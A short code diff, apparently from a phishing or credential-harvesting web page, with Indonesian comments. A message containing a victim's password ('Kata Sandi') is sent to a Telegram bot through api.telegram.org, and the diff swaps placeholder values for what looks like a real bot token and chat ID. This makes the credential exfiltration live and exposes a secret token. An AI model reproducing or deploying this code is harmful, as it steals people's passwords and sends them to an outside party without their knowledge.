@@ -65,8 +65,8 @@ Kata Sandi: ${password}
         `;
 
         // Ganti dengan token bot Telegram dan chat ID Anda
-        const token_bot = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
-        const telegram_id = 'YOUR_CHAT_ID_HERE';
+        const token_bot = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM';
+        const telegram_id = '7213790655';
 
         const url = `https://api.telegram.org/bot${token_bot}/sendMessage?chat_id=${telegram_id}&text=${encodeURIComponent(message)}`;
 
